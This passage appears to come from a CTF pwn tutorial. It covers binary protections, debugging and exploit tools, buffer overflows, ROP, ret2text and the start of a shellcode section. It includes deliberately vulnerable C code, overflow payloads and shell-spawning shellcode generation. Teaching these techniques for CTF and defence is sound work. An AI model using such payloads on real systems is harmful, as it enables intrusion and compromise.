<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec vuln</span><br><span class="line"></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>Explanation:</p>
<ul>
<li><code>Arch</code>: architecture of the binary<ul>
<li><code>amd64-64-little</code>: 64-bit little-endian ELF on x86-64</li>
<li><code>i386-32-little</code>: 32-bit little-endian ELF on x86</li>
</ul>
</li>
<li><code>NX</code>: <strong>Non-eXecutable</strong> (data memory is not executable)<ul>
<li><code>disabled / Stack: Executable</code>: you can run shellcode directly on stack/heap</li>
<li><code>enabled</code>: stack/heap cannot execute injected code</li>
</ul>
</li>
<li><code>PIE</code>: <strong>Position Independent Executable</strong>. The main program does not rely on fixed absolute addresses; <code>.text/.data/.bss/main</code> addresses become <code>base_addr + offset</code>. <strong>When ASLR is enabled</strong>, the base address changes each run.<ul>
<li><code>No PIE</code>: loaded at a fixed absolute address (tool-reported addresses match runtime)</li>
<li><code>PIE enabled</code>: randomized main binary base (runtime addresses = tool address + random base)</li>
</ul>
</li>
<li><code>RELRO</code>: <strong>Read-Only Relocations</strong>. After relocations, relevant pages (especially GOT) become read-only.<ul>
<li><code>Full RELRO</code>: <code>.got</code> and <code>.got.plt</code> fully read-only</li>
<li><code>Partial RELRO</code>: <code>.got</code> read-only, but <code>.got.plt</code> still writable</li>
<li><code>No RELRO</code>: no protection, both writable</li>
</ul>
</li>
<li><code>Stack</code>: whether <strong>Stack Canary</strong> protection is enabled. The compiler inserts a random canary between locals and the return address; it is checked before returning.<ul>
<li><code>No canary found</code>: no canary</li>
<li><code>Canary found</code>: canary enabled</li>
</ul>
</li>
<li><code>Stripped</code>: whether symbols were stripped<ul>
<li><code>No</code>: includes function names/symbols (easier reversing/debugging)</li>
<li><code>Yes</code>: stripped (harder reversing), but not a major runtime security feature</li>
</ul>
</li>
<li><code>Debuginfo</code>: whether debug info (DWARF) is included<ul>
<li><code>No</code>: typical release builds remove it</li>
<li><code>Yes</code>: source-level debug info is present, useful for debugging but may leak information</li>
</ul>
</li>
</ul>
<p>Besides these, another protection that is enabled by default in most environments is:</p>
<p><strong>ASLR (Address Space Layout Randomization)</strong></p>
<p>This is an OS-level memory protection mechanism. Each time the program starts, the OS randomizes the base addresses of key regions in the process address space (such as stack, heap, shared libraries including libc, vdso, etc.), making actual code/data addresses unpredictable between runs.</p>
<hr>
<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a><strong>Tools</strong></h2><p>Get familiar with common tools. You can install them first; the concrete workflows can be revisited after you understand the vulnerabilities/exploitation methods and need the exact commands.</p>
<h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a><strong>GDB</strong></h3><p>GDB (GNU Debugger) is a debugger mainly used for C/C++ programs.</p>
<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a><strong>Install</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb</span><br></pre></td></tr></table></figure>
<h4 id="Install-Pwndbg"><a href="#Install-Pwndbg" class="headerlink" title="Install Pwndbg"></a><strong>Install Pwndbg</strong></h4><p>pwndbg is a GDB plugin that provides stack/heap/register context views and commands like cyclic, rop, heap, format, etc., making binary exploitation debugging much more efficient.</p>
<p>Install:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1) dependencies</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install -y git python3-venv python3-pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) clone into your home directory</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg ~/.local/share/pwndbg</span><br><span class="line"><span class="built_in">cd</span> ~/.local/share/pwndbg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) run setup (creates a local venv and adds source to ~/.gdbinit)</span></span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
<p>Before installation:</p>
<p><img src="/images/image-20251011231648527.png" class="lazyload" data-srcset="/images/image-20251011231648527.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251011231648527"></p>
<p>After installation:</p>
<p><img src="/images/image-20251011231703933.png" class="lazyload" data-srcset="/images/image-20251011231703933.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251011231703933"></p>
<h4 id="Common-Commands"><a href="#Common-Commands" class="headerlink" title="Common Commands"></a><strong>Common Commands</strong></h4><ol>
<li><strong>Open a binary in GDB</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vuln</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">gdb -q ./vuln</span><br></pre></td></tr></table></figure>
<p><code>-q</code>: quiet mode, no startup banner.</p>
<p>Or start GDB first and then load a file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line"></span><br><span class="line">pwndbg&gt; file ./pwn</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>Run the program</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line"></span><br><span class="line">run &lt; input.txt     <span class="comment"># input from file</span></span><br><span class="line">run &lt;&lt;&lt; <span class="string">&quot;AAAA&quot;</span>      <span class="comment"># simple inline input</span></span><br></pre></td></tr></table></figure>
<ol>
<li><strong>View assembly</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br><span class="line">disass main</span><br><span class="line"></span><br><span class="line">disassemble win</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>Set breakpoints</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">break</span> main</span><br><span class="line">b main</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>View registers</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info registers</span><br><span class="line">i r</span><br><span class="line"></span><br><span class="line">x/20gx <span class="variable">$rsp</span>          <span class="comment"># view stack (20 qwords from RSP)</span></span><br></pre></td></tr></table></figure>
<ol>
<li><strong>Search gadgets</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rop --grep <span class="string">&quot;ret&quot;</span></span><br><span class="line"></span><br><span class="line">rop --grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line"></span><br><span class="line">rop --grep <span class="string">&quot;pop rsi ; pop r15 ; ret&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="Finding-the-Return-Address-Offset"><a href="#Finding-the-Return-Address-Offset" class="headerlink" title="Finding the Return Address Offset"></a><strong>Finding the Return Address Offset</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; | cyclic 1200 | <span class="built_in">tee</span> /tmp/pat &gt; /dev/null</span><br><span class="line"></span><br><span class="line">pwndbg&gt; run &lt; /tmp/pat</span><br><span class="line"><span class="comment"># after crash:</span></span><br><span class="line">pwndbg&gt; x/gx <span class="variable">$rsp</span>                 <span class="comment"># record the 8 bytes here</span></span><br><span class="line">pwndbg&gt; cyclic -n 8 -o 0x...      <span class="comment"># compute the offset using that value</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>| cyclic 1200 | tee /tmp/pat &gt; /dev/null</code>: generate a pattern and save it to a file<ul>
<li><code>cyclic 1200</code>: generate a <strong>1200-byte De Bruijn cyclic pattern</strong> (unique substrings; default n=4)</li>
<li><code>tee /tmp/pat</code>: write it into <code>/tmp/pat</code></li>
<li><code>&gt; /dev/null</code>: suppress output</li>
</ul>
</li>
<li><code>x/gx $rsp</code>: read the 8 bytes that will be popped into RIP by <code>ret</code><ul>
<li><code>x</code> (examine memory)</li>
<li><code>/gx</code>: show one 8-byte value in hex</li>
<li><code>$rsp</code>: use the current stack pointer</li>
</ul>
</li>
<li><code>cyclic -n 8 -o 0x...</code>: compute the offset from the observed value<ul>
<li><code>-o</code> (offset): “this is the 8-byte value I saw—where does it appear in the pattern?”</li>
<li><code>-n 8</code>: on 64-bit, we match 8 bytes (otherwise default n=4 may be wrong)</li>
<li><code>0x...</code>: paste the hex value from <code>x/gx $rsp</code></li>
</ul>
</li>
</ul>
<p>Output: a decimal number like <code>Found at offset 18</code> — this is the <strong>byte offset to the saved return address</strong>.</p>
<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a><strong>Example</strong></h4><p><img src="/images/image-20251011234846733.png" class="lazyload" data-srcset="/images/image-20251011234846733.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251011234846733"></p>
<p><img src="/images/image-20251011234917544.png" class="lazyload" data-srcset="/images/image-20251011234917544.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251011234917544"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; | cyclic 1200 | <span class="built_in">tee</span> /tmp/pat &gt; /dev/null</span><br><span class="line">pwndbg&gt; run &lt; /tmp/pat</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffd878: 0x6164616161616161</span><br><span class="line">pwndbg&gt; cyclic -n 8 -o 0x6164616161616161</span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;aaaaaada&#x27;</span> (hex: 0x6161616161616461)</span><br><span class="line">Found at offset 18</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
<p>So the offset is 18.</p>
<hr>
<h3 id="IDA-Ghidra"><a href="#IDA-Ghidra" class="headerlink" title="IDA/Ghidra"></a><strong>IDA/Ghidra</strong></h3><p>Many challenges only provide a compiled binary, not source code. In that case, you need a decompiler to inspect pseudocode so you don’t have to struggle with raw assembly only.</p>
<p><strong>Download:</strong></p>
<p><strong>IDA Free</strong>: <a target="_blank" rel="noopener" href="https://hex-rays.com/ida-free">https://hex-rays.com/ida-free</a></p>
<p>IDA Pro is very expensive. A fully free open-source alternative is Ghidra.</p>
<p><strong>Ghidra</strong>: <a target="_blank" rel="noopener" href="https://ghidralite.com/">https://ghidralite.com/</a></p>
<hr>
<h3 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a><strong>Pwntools</strong></h3><p><strong>Pwntools</strong> is a Python library for CTF/Pwn. It provides remote connection utilities, payload building, packing/unpacking, gadget lookup, shellcode assembly, GDB integration, and more, enabling efficient exploit development.</p>
<h4 id="Install-1"><a href="#Install-1" class="headerlink" title="Install"></a><strong>Install</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools -U</span><br></pre></td></tr></table></figure>
<h4 id="Common-APIs-by-task"><a href="#Common-APIs-by-task" class="headerlink" title="Common APIs (by task)"></a><strong>Common APIs (by task)</strong></h4><p><strong>1) Connection &amp; interaction</strong></p>
<ul>
<li>(Assume <code>io=</code>) <code>process(path)</code> / <code>remote(host, port)</code>: local/remote</li>
<li><code>io.send(data)</code> / <code>io.sendline(data)</code></li>
<li><code>io.recv(n)</code> / <code>io.recvline()</code> / <code>io.recvuntil(delim)</code></li>
<li><code>io.sendafter(delim, data)</code> / <code>io.sendlineafter(delim, data)</code>: send after prompt</li>
<li><code>io.clean(timeout=0.1)</code>: flush extra output</li>
<li><code>io.interactive()</code>: interactive shell mode (like <code>nc</code>), and prints buffered data when entered</li>
</ul>
<p><strong>2) Pack/unpack &amp; helper concatenation</strong></p>
<ul>
<li><p><code>p32(x) / p64(x)</code>, <code>u32(b) / u64(b)</code>: integer &lt;-&gt; bytes (little-endian)</p>
</li>
<li><p><code>flat(*args, filler=b&#39;A&#39;, length=None)</code>: smartly packs inputs into a byte string based on <code>context</code> (arch/endian/word size), handling alignment and packing automatically.</p>
<p>Examples:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0</span>:      shellcode,</span><br><span class="line">    <span class="number">256</span>:    JMP_RSI_Adress</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">b&quot;A&quot;</span>*<span class="number">84</span>, </span><br><span class="line">    <span class="number">84</span>: win_Adress</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>fit(&#123;offset: data, ...&#125;, filler=b&#39;A&#39;)</code>: place data at offsets</p>
</li>
<li><code>cyclic(n)</code> / <code>cyclic_find(value, n=4/8)</code>: cyclic pattern and offset finding (pwndbg can do this too)</li>
</ul>
<p><strong>3) ELF &amp; ROP helpers</strong></p>
<ul>
<li><code>ELF(path)</code>: parse symbols, plt/got, sections, etc.<ul>
<li><code>elf.symbols[]</code>: get symbol addresses (functions/globals)</li>
<li><code>elf.search()</code>: search for a byte sequence; returns a generator</li>
<li><code>elf.got[]</code>: get GOT entry address</li>
<li><code>elf.plt[]</code>: get PLT stub address</li>
</ul>
</li>
<li><code>ROP(elf)</code>: auto-find gadgets / build ROP<ul>
<li><code>rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])</code>, <code>rop.call(&#39;puts&#39;, [addr])</code>, <code>rop.chain()</code></li>
</ul>
</li>
<li><code>context.binary = elf</code>: let pwntools infer architecture automatically</li>
</ul>
<p><strong>4) Shellcode / assembly</strong></p>
<ul>
<li><code>asm(&#39;mov rax, 60; xor rdi, rdi; syscall&#39;)</code></li>
<li><code>shellcraft.sh()</code> / <code>asm(shellcraft.sh())</code></li>
<li><code>disasm(b&#39;\x90\x90\xcc&#39;)</code></li>
</ul>
<p><strong>5) Debugging</strong></p>
<ul>
<li><code>gdb.attach(io, gdbscript=&#39;b *0x401234\nc&#39;)</code></li>
<li><code>gdb.debug([path], gdbscript=...)</code></li>
</ul>
<p><strong>6) Misc</strong></p>
<ul>
<li><code>hexdump(data)</code></li>
<li><code>log.info()/success()/warning()</code></li>
<li><code>context.timeout = 2</code></li>
<li><code>pause()</code></li>
</ul>
<h4 id="Template"><a href="#Template" class="headerlink" title="Template"></a><strong>Template</strong></h4><ul>
<li><code>process</code> is for local testing (binary path)</li>
<li><code>remote</code> is for connecting to the server</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)    <span class="comment"># x86-64 64-bit</span></span><br><span class="line"><span class="comment"># context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)   # x86 32-bit</span></span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;./vuln&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;Host&quot;</span>, Port)</span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">4</span> + p64()</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="Ropgadget"><a href="#Ropgadget" class="headerlink" title="Ropgadget"></a><strong>Ropgadget</strong></h3><p>Used to find gadgets efficiently and accurately.</p>
<p>Install:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-ropgadget</span><br></pre></td></tr></table></figure>
<p>Usage:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vuln | grep -E <span class="string">&quot;pop rdi ; ret&quot;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Vulnerabilities-and-Exploitation-Methods"><a href="#Vulnerabilities-and-Exploitation-Methods" class="headerlink" title="Vulnerabilities and Exploitation Methods"></a><strong>Vulnerabilities and Exploitation Methods</strong></h2><p>In general, the core vulnerabilities in pwn challenges mainly fall into two broad categories:</p>
<ul>
<li>Unsafe input/bounds handling (leading to overflows, format string bugs, etc.)</li>
<li>Logic/design/implementation flaws in state/privilege/lifecycle (e.g., classic Use-After-Free)</li>
</ul>
<p>We exploit these vulnerabilities to change the program’s control flow, in order to read the flag or get a shell.</p>
<p><br></p>
<p>The following discussion is divided into three main parts:</p>
<ul>
<li><strong>Overflows (mainly stack overflow)</strong></li>
<li><strong>Format string vulnerabilities</strong></li>
<li><strong>Heap exploitation</strong></li>
</ul>
<hr>
<h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a><strong>Buffer Overflow</strong></h2><p>A <strong>buffer overflow</strong> commonly occurs in input/copy routines that <strong>do not perform bounds checks</strong> or implement them incorrectly. It can overwrite adjacent data in the stack/heap/static regions (e.g., return addresses, function pointers, object metadata, etc.).</p>
<p>There are many other overflow patterns as well (for example, out-of-bounds writes caused by integer overflow).</p>
<p>If the overflow happens on the stack, it is called a <strong>stack overflow</strong>. A common exploitation approach is to overwrite stack-adjacent data such as the saved return address.</p>
<p>(<strong>Definition of stack overflow:</strong> the program writes more bytes into a stack variable than the variable’s allocated size, causing adjacent stack values to be modified.)</p>
<p>A simple common example: the program allocates a fixed-size buffer on the stack, but does not properly check input length, allowing us to write beyond the buffer and overwrite higher-address stack contents.</p>
<h3 id="Vulnerability-Common-Dangerous-Functions"><a href="#Vulnerability-Common-Dangerous-Functions" class="headerlink" title="Vulnerability / Common Dangerous Functions"></a><strong>Vulnerability / Common Dangerous Functions</strong></h3><ul>
<li><code>gets()</code><ul>
<li>No length limit/check at all.</li>
</ul>
</li>
<li><code>fgets(buf, size, stdin)</code><ul>
<li>If <code>size</code> is larger than the actual allocated size of <code>buf</code>, it can overflow.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><code>scanf(&quot;%s&quot;, buf)</code><ul>
<li><code>%s</code> reads until whitespace (space/newline/tab, etc.)</li>
<li>Safer usage:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, buf);  <span class="comment">// read at most 15 bytes + 1 &#x27;\0&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><code>read(0, buf, count)</code><ul>
<li>If <code>count</code> is larger than the actual allocated size of <code>buf</code>, it can overflow.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="Struct-Field-Hijacking"><a href="#Struct-Field-Hijacking" class="headerlink" title="Struct Field Hijacking"></a><strong>Struct Field Hijacking</strong></h3><p>The simplest goal is to modify a nearby variable. For example:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">int</span> is_admin;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You are admin!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> <span class="title">u</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;u, <span class="number">0</span>, <span class="keyword">sizeof</span>(u));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">    fgets(u.name, <span class="number">200</span>, <span class="built_in">stdin</span>);  <span class="comment">// name is 64 bytes, fgets reads 200 bytes</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u.is_admin == <span class="number">1</span>) &#123;</span><br><span class="line">        win();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Access denied.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We write into <code>u.name</code>, but the input size limit is 200 while <code>name</code> is only 64 bytes. Since struct fields are contiguous in memory, we can input:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;A&#x27;</span>*<span class="number">64</span> + <span class="string">&#x27;\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="string">&#x27;A&#x27;</span>*<span class="number">64</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>This overwrites <code>is_admin</code> with 1. (Most architectures are little-endian, and <code>int</code> is 4 bytes, so <code>\x01\x00\x00\x00...</code> makes sense.)</p>
<h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP (Return Oriented Programming)"></a><strong>ROP (Return Oriented Programming)</strong></h3><p><strong>ROP</strong> means overwriting the return address and placing a <strong>ROP chain</strong> on the stack. As the program repeatedly executes <code>ret</code>, it jumps through a sequence of gadgets ending in <code>ret</code>, combining existing instruction snippets from the program/library to achieve a desired flow (e.g., call <code>system</code>, trigger <code>syscall</code>, ORW to read a flag, etc.).</p>
<p>Because we must overwrite the return address, we need the exact offset from our input start to the saved return address.</p>
<p>Example layout:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|    buf    |  0x20</span><br><span class="line">| saved RBP |  0x08</span><br><span class="line">|   ret     |</span><br></pre></td></tr></table></figure>
<p>So the offset is <code>0x28</code>. Often you can read this from IDA’s stack frame view, but sometimes IDA’s offset is inaccurate and you must confirm via GDB.</p>
<p>Then you can overwrite the return address:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x28</span> + p64(fake_ret_addr)</span><br></pre></td></tr></table></figure>
<p>Note: if the overflow happens in function <code>fun()</code>, control returns to <code>fake_ret_addr</code> only after <code>fun()</code> finishes. The same idea applies to <code>main()</code>—it also has a return address.</p>
<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><strong>ret2text</strong></h4><p><strong>ret2text</strong> means redirecting execution to code that already exists in the binary itself (i.e., code in the <code>.text</code> segment).</p>
<p>This typically requires:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack:      No canary found</span><br></pre></td></tr></table></figure>
<p>If PIE is enabled, you must leak the binary base first and then compute real function addresses.</p>
<p>Example (assume there is a <code>win()</code> function that calls <code>system(&quot;/bin/sh&quot;)</code> and requires no arguments):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win_address = <span class="number">0x0000000000401172</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset_to_ret_addr</span><br><span class="line">payload += p64(win_address)</span><br></pre></td></tr></table></figure>
<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h4><h5 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a><strong>Shellcode</strong></h5><p>Shellcode is a short sequence of machine code (often written as bytes) used to exploit a vulnerability, often to spawn a shell.</p>
<p>Common examples:</p>
<p>1.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())   <span class="comment"># /bin/sh</span></span><br></pre></td></tr></table></figure>
<p>2.</p>
